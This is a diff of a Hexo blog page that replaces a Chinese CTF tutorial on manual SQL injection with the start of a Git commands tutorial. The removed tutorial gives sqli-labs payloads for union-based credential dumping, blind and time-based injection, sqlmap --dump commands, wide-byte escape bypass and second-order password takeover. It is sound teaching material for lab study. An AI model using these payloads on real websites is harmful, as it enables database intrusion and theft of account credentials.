@@ -5,10 +5,19 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="ctf手工SQL注入, Liloong3t的博客">
+    <meta name="keywords" content="Git常用命令与教程, Liloong3t的博客">
     <meta name="baidu-site-verification" content="code-5WkfinfGVW">
     <!-- <meta name="google-site-verification" content="" /> -->
-    <meta name="description" content="SQL注入SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令的 web攻击方式。权限大时可写入webshell，后门，系统命令执行，权限小时可通过注入获得系统敏感信息（管">
+    <meta name="description" content="Git常用命令与教程Git常用命令
+
+名词介绍
+
+Workspace：工作区
+Index/Stage：暂存区，也叫索引
+Repository：仓库区（或本地仓库），也存储库
+Remote：远程仓库
+
+理解这些名词，在脑中形成知识体系，便于理">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +25,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>ctf手工SQL注入 | Liloong3t的博客</title>
+    <title>Git常用命令与教程 | Liloong3t的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -538,13 +547,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/wlop.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        ctf手工SQL注入
+                        Git常用命令与教程
                     </div>
                 </div>
             </div>
@@ -655,12 +664,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web/" target="_blank">
-                                <span class="chip bg-color">web</span>
+                            <a href="/tags/Git/" target="_blank">
+                                <span class="chip bg-color">Git</span>
                             </a>
                         
-                            <a href="/tags/ctf/" target="_blank">
-                                <span class="chip bg-color">ctf</span>
+                            <a href="/tags/教程/" target="_blank">
+                                <span class="chip bg-color">教程</span>
                             </a>
                         
                     </div>
@@ -683,7 +692,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-16
+                    2021-02-02
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -697,14 +706,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        5.1k
+                        1.6k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        19 分
+                        6 分
                     </div>
                     
                 
@@ -716,254 +725,257 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令的 web攻击方式。权限大时可写入webshell，后门，系统命令执行，权限小时可通过注入获得系统敏感信息（管理员账号密码，重要数据等），修改数据库信息。</p>
-<blockquote>
-<p>按照注入点类型来分类</p>
+                <h1 id="Git常用命令与教程"><a href="#Git常用命令与教程" class="headerlink" title="Git常用命令与教程"></a>Git常用命令与教程</h1><h1 id="Git常用命令"><a href="#Git常用命令" class="headerlink" title="Git常用命令"></a>Git常用命令</h1><blockquote>
 </blockquote>
-<h3 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1" target="_blank" rel="noopener">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。</p>
-<p>这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p>
-<h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href="http://xxx.com/users.php?name=admin" target="_blank" rel="noopener">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p>
-<p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name='admin' and 1=1 '</code> 我们需要将这些烦人的引号给处理掉。</p>
-<h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>"keyword=关键字"</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p>
-<p>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'</code></p>
+<h2 id="名词介绍"><a href="#名词介绍" class="headerlink" title="名词介绍"></a>名词介绍</h2><p><img src="/img/16e00be00de88281" alt="img"></p>
 <blockquote>
-<p>按照数据提交的方式来分类</p>
+<p><strong><code>Workspace</code></strong>：工作区</p>
+<p><strong><code>Index/Stage</code></strong>：暂存区，也叫索引</p>
+<p><strong><code>Repository</code></strong>：仓库区（或本地仓库），也存储库</p>
+<p><strong><code>Remote</code></strong>：远程仓库</p>
 </blockquote>
-<h3 id="（1）GET-注入"><a href="#（1）GET-注入" class="headerlink" title="（1）GET 注入"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href="http://xxx.com/index.php?id=1" target="_blank" rel="noopener">http://xxx.com/index.php?id=1</a> , id 是注入点。</p>
-<h3 id="（2）POST-注入"><a href="#（2）POST-注入" class="headerlink" title="（2）POST 注入"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
-<h3 id="（3）Cookie-注入"><a href="#（3）Cookie-注入" class="headerlink" title="（3）Cookie 注入"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>
-<h3 id="（4）HTTP-头部注入"><a href="#（4）HTTP-头部注入" class="headerlink" title="（4）HTTP 头部注入"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
-<blockquote>
-<p>按照执行效果来分类</p>
-</blockquote>
-<h3 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p>
-<h3 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
-<h3 id="（3）基于报错注入"><a href="#（3）基于报错注入" class="headerlink" title="（3）基于报错注入"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
-<ol>
-<li>单引号</li>
-<li>双引号</li>
-<li>基于数字型注入</li>
-</ol>
-<h3 id="（4）联合查询注入"><a href="#（4）联合查询注入" class="headerlink" title="（4）联合查询注入"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p>
-<h3 id="（5）堆查询注入"><a href="#（5）堆查询注入" class="headerlink" title="（5）堆查询注入"></a>（5）堆查询注入</h3><p>可以同时执行多条语句的执行时的注入。</p>
-<h3 id="（6）宽字节注入"><a href="#（6）宽字节注入" class="headerlink" title="（6）宽字节注入"></a>（6）宽字节注入</h3><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</p>
-<h3 id="基于sqli-labs的实践操作"><a href="#基于sqli-labs的实践操作" class="headerlink" title="基于sqli-labs的实践操作"></a>基于sqli-labs的实践操作</h3><h4 id="1-基于报错的GET-sql注入"><a href="#1-基于报错的GET-sql注入" class="headerlink" title="1.基于报错的GET sql注入"></a>1.基于报错的GET sql注入</h4><h5 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h5><p><img src="/img/less-1.png" alt=""></p>
-<p>提示说输入一个数字作为ID的值</p>
-<p>那么先在url输入?id=1</p>
-<p><img src="/img/less-1%E8%BE%93%E5%85%A5id=1.png" alt=""></p>
-<p>显示查询成功，返回了用户Dumb</p>
-<p>然后尝试使其报错，输入 ?id=1’</p>
-<p><img src="/img/less-1%E8%BE%93%E5%85%A5id-1'.png" alt=""></p>
-<p>报错了，显示为 ‘’1’’ LIMIT 0,1’</p>
-<p>有了这个，我们就可以揣测一下网站后端的sql请求语句了</p>
-<p>首先，这个报错语句是被 ‘ ‘ 单引号闭合的，于是将其拆分 ‘   ‘1’’ LIMIT 0,1   ‘，可知报错的段落是 ‘1’’ LIMIT 0,1,由于我们输入的id值是1’</p>
-<p>,所以再拆分一下为’   1’   ‘ LIMIT 0,1</p>
-<p>由此可以看出后台语句大致是 </p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = '$id' limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p> id被单引号包裹，这是字符型注入点</p>
-<h5 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h5><p><img src="/img/less-2.png" alt=""></p>
-<p>流程与上面差不多</p>
-<p>不同的是，这次输入id=1’后报错为 ‘’ LIMIT 0,1’</p>
-<p>还是用和上面一样的方法拆分这段 ，’     ‘ LIMIT 0,1      ‘  –&gt;’ LIMIT 0,1</p>
-<p>可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去</p>
-<p>由此可以看出后台语句大致是 </p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id =$id limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>id没有被单引号包裹，这是一个数字型注入点</p>
-<h5 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h5><p><img src="/img/less-3.png" alt=""></p>
-<p>这次的报错是 ‘’1’’) LIMIT 0,1’</p>
-<p>拆分 ‘   ‘1’’) LIMIT 0,1   ‘–&gt;’1’’) LIMIT 0,1–&gt;’   <em>1’</em>   ‘) LIMIT 0,1</p>
-<p>显然，后台语句是</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了</p>
-<p>比如上面这个less-3</p>
-<p>我们试着把输入改为 id=1’) –+或id=1’) –%20</p>
-<p><img src="/img/--+.png" alt=""></p>
-<p>![](/img/– .png)</p>
-<p>都成功了，这就说明后台语句和我们想的八九不离十了</p>
-<h5 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h5><p>这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被””包裹了，输入的id值都会被当作字符串，加单引号括号都没用。</p>
-<p>那就使用\来制造报错，输入 id=1\</p>
-<p>返回报错 ‘“1\“) LIMIT 0,1’–&gt;”1\“) LIMIT 0,1</p>
-<p>\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错</p>
-<p>合理推测：</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = ("id") limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>验证：</p>
-<p><img src="/img/less-4.png" alt=""></p>
-<p>这样4种不同的注入点的后台语句就通过报错大致的试出来了</p>
-<p>之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等</p>
-<p>例如less-1(字符型) 就可以输入?id=1’ order by 1[,2,3,4… ] –+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用</p>
-<p>less-1能够order by到3，也就是它有3个字段，于是接下来union注入</p>
-<p>我们要构造的语句是SELECT [username,password] FROM user WHERE id = ‘0’ union select 1,2,3 –+ limit 0,1</p>
-<p>所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0’ union select 1,2,3 –+</p>
-<p>这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果</p>
-<p>效果</p>
-<p><img src="/img/union%E6%B3%A8%E5%85%A5.png" alt=""></p>
-<p>可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用</p>
-<p>于是接下来注入 id=0’ union select 1,user(),database() –+</p>
-<p><img src="/img/union%E7%88%86%E5%BA%93.png" alt=""></p>
-<p>爆出了用户名和使用的数据库名</p>
-<p>然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入</p>
-<p>例如：</p>
-<p>爆表：</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>​            information_schema是储存了所有数据库信息的库，tables储存了所有表信息的表</p>
-<p><img src="/img/union%E7%88%86%E8%A1%A8.png" alt=""></p>
-<p>看到了最后一个表是’users’,可用于下一步爆字段</p>
-<p>爆字段：</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+        //记得最后这个表名要加单引号，不然没用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/img/union%E7%88%86%E5%AD%97%E6%AE%B5.png" alt=""></p>
-<p>爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(username,0x3a,password),3 from [security.]users --+        //有时候要在表名前面加上数据库名，不然也出不来,即 这个环境下的security.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/img/union%E7%88%86%E5%87%BA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png" alt=""></p>
-<p>好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了</p>
-<h2 id="利用SQLmap工具进行sql注入"><a href="#利用SQLmap工具进行sql注入" class="headerlink" title="利用SQLmap工具进行sql注入"></a>利用SQLmap工具进行sql注入</h2><p>进入SQLmap工具目录打开命令行，输入命令</p>
-<pre class="line-numbers language-bash"><code class="language-bash">py sqlmap.py -u http://xxx.com/?id<span class="token operator">=</span>1 --dbs --batch        //输入点为id参数 --dbs参数用于探测数据库，--batch参数用于自动执行默认选项（省的我们在探测过程中一直按Y）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>如果只有一个注入点，可以不用在url两边加上双引号，如果有两个注入点，则需要将url用双引号括起来</p>
-<pre class="line-numbers language-bash"><code class="language-bash">py sqlmap.py -u <span class="token string">"http://xxx.com/?id=1&amp;digree=high"</span> --dbs --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>如果需要的数据就在本数据库里，则可以省去上面这一步，直接进行接下来的爆表，爆字段的操作</p>
-<pre class="line-numbers language-bash"><code class="language-bash">py sqlmap.py -u http://xxx.com/?id<span class="token operator">=</span>1 --tables --batch        //爆表
-假如爆出表名‘flag’<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-bash"><code class="language-bash">py sqlmap.py -u http://xxx.com/?id<span class="token operator">=</span>1 -T flag --columns --batch        //爆字段
-假如爆出字段‘flag’<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-bash"><code class="language-bash">py sqlmap.py -u http://xxx.com/?id<span class="token operator">=</span>1 -T flag -C flag --dump --batch        //爆出数据
-到这里就可以拿到我们想要的字段里的数据了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h3><p>采用以下语句拆（猜）解字符串</p>
-<p>猜解数据库名字长度</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">?id =1' and length(database())><=N --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>猜测数据库名字。</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">?id =1' and ascii(substr(database(),1,1))><=N --+        （利用二分法，ascii为ascii码，例如97=‘a’）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<blockquote>
-<p>SUBSTR(str,pos,len): 从pos开始的位置，截取len个字符</p>
-<p>所以substr(database(),1,1)意思是截取数据库名的第一个字符，用这种方式猜解数据库的第1，2，3…到最后一个字符。</p>
-<p>SUBSTR(str,pos): pos开始的位置，一直截取到最后 </p>
-</blockquote>
-<p>6、猜表名</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">?id=1' and (ascii(substr((select table_name from  information_schema.tables where  table_schema=database()),1,1)))><=N --+）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p> 7、猜列名：</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">?id=1' and (ascii(substr((select column_name from  information_schema.columns where table_schema=database() and  table_name=‘表名’ limit 0,1),1,1)))><=N --+ (如果报错可以加limit 0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p> 8、查字段</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">?id=1' and length((select 列名 from 数据库.表名 limit 0,1))>0 --+
-然后重复以上猜解字符串手法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><strong>实际上，还是直接使用sqlmap方便</strong>，直接在命令后面加 –technique B参数，则是指定进行布尔型注入（Boolen）。默认情况是BEUSTQ，即全部方式</p>
-<p> SQLMAP目前支持的注入方式包括（默认全进行）：</p>
-<blockquote>
-<p>  B: Boolean-based blind SQL injection（布尔型注入）</p>
-<p>  E: Error-based SQL injection（报错型注入）</p>
-<p>  U: UNION query SQL injection（可联合查询注入）</p>
-<p>  S: Stacked queries SQL injection（可多语句查询注入）</p>
-<p>  T: Time-based blind SQL injection（基于时间延迟注入）</p>
-<p>  Q: Inline SQL Injection (内联注入)</p>
-</blockquote>
-<h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>跟布尔盲注类似，也是猜解字符串，只不过由于前端回显更不明显，需要使用if和sleep语句来判断注入结果</p>
-<p>判断：</p>
-<pre><code>?id=1’ and sleep(5)        // 响应时间比正常情况多5秒，则存在延时注入</code></pre><p>查数据库</p>
-<pre><code>?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0)</code></pre><p>其他操作方式与布尔型类似。<br>例如：<br>尝试延时注入</p>
-<pre><code>?id=1’ and sleep(5) --+     //第一步,判断是否有延时注入
-?id=1' and if(length(database())&gt;&lt;=N,sleep(5),0) --+        //第二步，猜测数据库名长度
-?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0) --+     //第三步猜测数据库名</code></pre><p><strong>手工注入是不可能手工注入的，还是sqlmap省事</strong>，加参数 –technique=T，时间注入一步到位。</p>
-<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>GBK编码每个字符占两字节（bytes）</p>
-<p>ASCII编码每个字符占一字节</p>
-<p><strong>重点：注入原理</strong></p>
-<p><strong>PHP中使用的编码方式为GBK，</strong></p>
-<p><strong>函数执行（参数等）使用的是ASCII编码；</strong></p>
-<p><strong>而MYSQL使用的默认字符集是GBK等宽字节字符集。</strong></p>
-<p>当后端用PHP的函数（如addslashes()、mysql_real_escape_string()、mysql_escape_string()等函数）对用户输入进行检测，对危险字符进行转义时，就有可能发生宽字节注入漏洞。</p>
-<p>当源码中设置”set character_set_client=gbk”  时</p>
-<p>%df%27 可把程序中转义函数过滤的“\ ” （%5c）吃掉。</p>
-<blockquote>
-<p>如addslashes()函数会在用户输入的单引号 ‘ （%27）前面加一个反斜杠 \ （%5c），但如果我们在单引号前面加一个%df，即%df%27，经过addslashes()函数过滤后就变成了 %df%5c%27 ，但是在GBK编码中，%df%5c是一个汉字 “縗”</p>
-</blockquote>
-<p>例如：</p>
-<p><code>/1.php?id=1</code>存在宽字节注入时，则: <code>/1.php?id=-1’and 1=1%23</code>,-1后面的单引号会被转义成  \’</p>
-<p>但是提交：</p>
-<pre><code> /1.php?id=-1%df’and 1=1%23</code></pre><p> 时，</p>
-<p><code>%df</code>和 反斜杠 \ (%5c) 组合 <code>%df%5c</code>  编码后是一个 縗 字，这时候单引号依然存在，则会闭合成功，形成宽字节注入，使得后面的and语句成功执行。</p>
-<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入就是先在网站服务器里储存一些数据，这些数据可以构成恶意语法，然后再利用这些数据完成攻击，比如在该网站注册一个账号，用账号名字或密码作为payload执行注入攻击。这是最基本的原理。</p>
-<p>例如：如果有某网站的后台登录SQL语句是这样的</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM users WHERE username='$username' and password='$password'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>如果，我们先注册一个用户，用户名为”admin’ – “，且前端后端都通过了（现实场景是基本不太可能的，写题有一定可能），那么，当我们登录这个用户时，这个语句就变成了</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM users WHERE username='admin' -- ' and password='$password'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>这样，就直接登录了<strong>admin</strong>账户，如果admin账户存在的话。这就是二次注入的基本原理。</p>
-<p>可以抽象概括为两步：</p>
-<p>1.插入恶意数据</p>
-<p>2.引用恶意数据</p>
-<p><strong>应用场景</strong></p>
-<p>Web应用程序常使用</p>
-<p>addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数</p>
-<p>或者开启GPC（<code>magic_quote_gpc=on</code>,<strong><em>开启之后，能自动实现addslashes()和stripslashes()这两个函数的功能</em></strong>）</p>
-<p>来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。</p>
-<p>二次注入适用于绕过addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数，因为这些转义函数是用在第一次输入web服务器时，执行php语句时生效的，当储存入数据库，它该是怎么样就是怎么样了</p>
-<p>比如：</p>
-<p><code>admin' --</code>这个输入，直接传入后台经过addslashes()函数过滤后，就变成了<code>admin\' --</code>，这个嵌入sql语句是没用的，无法闭合sql语句。</p>
-<pre><code>UPDATE users SET PASSWORD='$pass' where username='admin\' -- ' and password='$curr_pass'</code></pre><p>但是如果把它作为一个账户名注册入数据库，它在数据库里就是<code>admin' --</code>。这时我们先以这个<code>admin' --</code>账户的身份登录进去，然后修改其密码，由于这时的账户名大概率不再经过addslashes()等函数的过滤了（已经以这个账户的身份登录进去了，语句中的用户名是直接从数据库中读出或者通过session传递的），仍然是<code>admin' --</code>，也是说，后台sql语句是</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">UPDATE users SET PASSWORD='$pass' where username='admin' -- ' and password='$curr_pass'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><code>--</code>后面的语句被注释，也就是说，我们修改的是admin账户的密码。</p>
-<p><strong>sqli-labs实例分析</strong></p>
-<p><strong>less-24</strong></p>
-<p><img src="/img/image-20210122114946180.png" alt="image-20210122114946180"></p>
-<p>一个登录界面，有创建新用户，也有忘记密码。</p>
-<p>登录的后端源码是这样的</p>
-<p><img src="/img/image-20210122123420557.png" alt="image-20210122123420557"></p>
-<p>用户名密码全都用mysql_real_escape_string()函数过滤了，所以直接注入是会被转义掉单引号的</p>
-<p>我们先看看数据库中有哪些用户名</p>
-<p><img src="/img/image-20210122115233156.png" alt="image-20210122115233156"></p>
-<p>sqli的数据库是security,users表中有以上用户名和密码</p>
-<p>那么我们构建一个<code>admin' -- -</code>用户，新建一下</p>
-<p>看一下创建新用户的源码</p>
-<p><img src="/img/image-20210122115619387.png" alt="image-20210122115619387"></p>
-<p>可以看到三个输入都是用mysql_escape_string()函数过滤了的</p>
-<p>然而</p>
-<p><img src="/img/image-20210122124433626.png" alt="image-20210122124433626"></p>
-<p>存储到数据库中的数据就是原始数据，我们可以看到表中多了一行<code>admin' -- -</code>用户的数据</p>
-<p>现在以这个用户的身份登录</p>
-<p><img src="/img/image-20210122125026004.png" alt="image-20210122125026004"></p>
-<p>这里我们可以看到，它的界面上显示的用户名是<code>admin' -- -</code>，没有转义符号反斜杠<code>\</code>，为什么呢？我们看看源码</p>
-<p><img src="/img/image-20210122130743856.png" alt="image-20210122130743856"></p>
-<p>它输出的是session中的”username”</p>
-<p>session中的“username”是哪来的呢？在login.php里面</p>
-<p><img src="/img/image-20210122131034335.png" alt="login.php"></p>
-<p>这里显示的很清楚了，$row是数据库查询结果返回的结果集列表，sqllogin()函数返回$row[1]给$login变量，$login变量再赋值给$_SESSION[“username”]，所以session中的username是从数据库中读取的，未经过安全函数过滤。</p>
-<p>然后我们来修改密码</p>
-<p><img src="/img/image-20210122131804080.png" alt="pass-change.php"></p>
-<p>以上是pass-change.php文件中的代码，可以看到$username由session赋值，然后用于sql语句中也就是说，此时它的sql语句实际上是</p>
-<pre class="line-numbers language-mysql"><code class="language-mysql">UPDATE users SET PASSWORD='$pass' where username='admin' -- -' and password='$curr_pass' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><code>admin</code>用单引号闭合而且后面被注释掉了，此时我们操作的用户实际上是<code>admin</code>用户</p>
-<p>把密码改成<code>12345</code></p>
-<p><img src="/img/image-20210122132251979.png" alt="修改成功"></p>
-<p>再来看看数据库</p>
-<p><img src="/img/image-20210122132407600.png" alt="admin的密码变成了12345"></p>
-<p>第8行数据中，admin用户的密码变成了12345，sql注入成功，我们修改了admin用户的密码，可以直接登录admin账户了</p>
-<p><strong>二次urldecode 注入</strong></p>
-<p>Web应用程序通常使用</p>
-<p>addslashes() 、mysql_real_escape_string()、mysql_escape_string()函数</p>
-<p>或者开启GPC（<code>magic_quote_gpc=on</code>,<em>开启之后，能自动实现addslshes()和stripslashes()这两个函数的功能</em>）</p>
-<p>来防止注入，也就是给单引号(‘’)、双引号(“”)、反斜杠()和NULL加上反斜杠转义。</p>
-<p>如果某处使用了urldecode或者 rawurldecode 函数，则会导致二次解码生成单引号引发注入，即二次urldecode注入。</p>
-<p><strong>原理：</strong></p>
-<p>由于我们提交参数到webserver时，webserver会自动解码一次，当提交参数</p>
-<pre><code>id=1%2527</code></pre><p>经过第一次解码后，%25 解码结果为 %，则参数此时为id=1%27</p>
-<p>第二次程序使用了urldecode 或者 rawurldecode  函数来解码id参数，则解码后结果为</p>
-<pre><code>id=1'</code></pre><p>这时单引号成功出现，输入闭合，绕过了转义函数或GPC，可以在后面添加执行sql注入语句了。</p>
-<p>这个的原理类似于上面的宽字节注入</p>
-<h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><h3 id="User-agent"><a href="#User-agent" class="headerlink" title="User-agent"></a>User-agent</h3><p>后台SQL语句中使用了HTTP头中的<code>User-agent</code>字段中的数据</p>
-<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=3</code></pre><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>后台SQL语句中使用了HTTP头中<code>Cookie</code>字段中的数据</p>
-<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=3</code></pre><h3 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h3><p>后台SQL语句中使用了HTTP头中的<code>Refer</code>字段中的数据</p>
-<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=3</code></pre><h3 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h3><p>后台SQL语句中使用了HTTP头中的<code>host</code>字段中的数据</p>
-<pre><code>sqlmap &gt; py sqlmap.py -u “url” --dbs --level=5</code></pre><p>以上几种注入漏洞的执行原理非常“普通”，只不过注入点位置特殊而已，熟练运用sqlmap工具即可轻松解决</p>
-<h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><p>上面的http头注入其实就是一种稍微特殊的post注入，<strong>post注入</strong>，顾名思义，就是注入点在post表单里的sql注入漏洞，一般手工注入需要借助工具（Burpsuite）抓包，然后修改post数据。</p>
